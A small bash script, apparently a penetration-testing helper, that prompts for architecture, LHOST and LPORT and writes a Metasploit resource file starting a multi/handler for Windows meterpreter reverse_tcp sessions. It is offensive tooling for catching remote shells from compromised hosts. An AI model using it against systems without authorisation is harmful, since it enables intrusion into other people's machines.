#!/bin/bash
# listener_set.sh sets up a metasploit resource script for either a windows x86 or x64 reverse_tcp handler
# Use the resource script in msfconsole > resource [listenerx86.rc]
#				       or resource [listenerx64.rc]

read -p "x86 or x64? " arch
read -p "Set LHOST: " lhost
read -p "Set LPORT: " lport

echo "use multi/handler" > ./rc/listener$arch.rc
if [ $arch == "x86" ]; then
    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ./rc/listener$arch.rc
elif [ $arch == "x64" ]; then
    echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> ./rc/listener$arch.rc
fi

echo "set LHOST $lhost" >> ./rc/listener$arch.rc
echo "set LPORT $lport" >> ./rc/listener$arch.rc
echo "set ExitOnSession false" >> ./rc/listener$arch.rc
echo "exploit -j -z" >> ./rc/listener$arch.rc
